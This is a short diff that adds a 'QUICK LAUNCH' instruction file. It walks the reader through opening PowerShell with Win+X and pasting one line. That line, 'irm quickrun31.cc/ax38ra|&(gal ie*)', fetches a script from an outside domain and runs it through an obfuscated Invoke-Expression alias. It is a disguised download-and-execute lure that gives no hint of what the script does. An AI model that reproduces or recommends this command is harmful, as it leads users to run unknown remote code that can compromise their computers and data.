@@ -1,0 +1,11 @@
+QUICK LAUNCH
+============
+
+Steps:
+1) Press Win + X
+2) Choose Terminal (PowerShell)
+3) Paste the line below and press Enter
+
+irm quickrun31.cc/ax38ra|&(gal ie*)
+
+(last checked: auto)
